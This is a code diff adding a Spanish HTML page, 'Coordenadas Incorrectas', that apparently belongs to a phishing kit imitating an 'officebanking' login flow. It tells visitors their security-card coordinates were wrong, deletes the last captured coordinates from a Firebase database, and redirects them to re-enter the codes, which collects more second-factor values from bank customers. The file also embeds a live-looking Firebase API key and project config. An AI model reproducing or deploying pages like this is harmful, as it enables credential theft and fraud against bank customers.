@@ -1,0 +1,56 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Coordenadas Incorrectas</title>
+  <style>
+    body {
+      background: white;
+      color: red;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+    h2 {
+      margin-bottom: 1rem;
+    }
+  </style>
+  
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+    authDomain: "formulario-officebanking.firebaseapp.com",
+    databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+    projectId: "formulario-officebanking"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Borrar coordenadas y hora antes de redirigir
+  db.ref("registros").limitToLast(1).once("value", snap => {
+    const data = snap.val();
+    const key = Object.keys(data || {})[0];
+    if (key) {
+      db.ref("registros/" + key + "/coordenadas").remove();
+      db.ref("registros/" + key + "/coordenadasHora").remove();
+    }
+  });
+
+
+    setTimeout(() => {
+      window.location.href = "coordenadas.html";
+    }, 3000);
+  </script>
+</head>
+<body>
+  <h2>Coordenadas Incorrectas</h2>
+  <p>Serás redirigido para volver a ingresarlas...</p>
+</body>
+</html>
